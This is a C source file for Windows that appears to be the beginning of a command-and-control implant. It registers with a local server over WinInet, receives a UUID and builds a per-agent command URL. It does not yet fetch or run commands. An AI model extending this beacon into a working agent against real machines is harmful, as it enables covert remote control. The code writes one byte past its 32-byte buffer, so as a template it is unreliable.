#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>

#pragma warning(disable : 4996)
#pragma comment (lib, "Wininet.lib")

BOOL SendRequest(LPCWSTR EndpointUrl, char *uuid) {

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	PBYTE		pBytes = NULL;

	DWORD		dwBytesRead = NULL;

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating a buffer for the payload
	pBytes = (PBYTE)LocalAlloc(LPTR, 32);

	// Reading the payload
	if (!InternetReadFile(hInternetFile, pBytes, 32, &dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pBytes[dwBytesRead] = '\0';
	
	memcpy(uuid, pBytes, dwBytesRead);

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

int main() {

	LPCWSTR Url = L"http://127.0.0.1:5000/agent/register";
	char request_output[256];
	SendRequest(Url, request_output);
	printf("My UUID: %s\n", request_output);

	wchar_t CommandUrl[256];
	swprintf(CommandUrl, 256, L"http://127.0.0.1:5000/agent/%S/command", request_output);
	wprintf(L"URL: %s", CommandUrl);
	
	return 0;
}
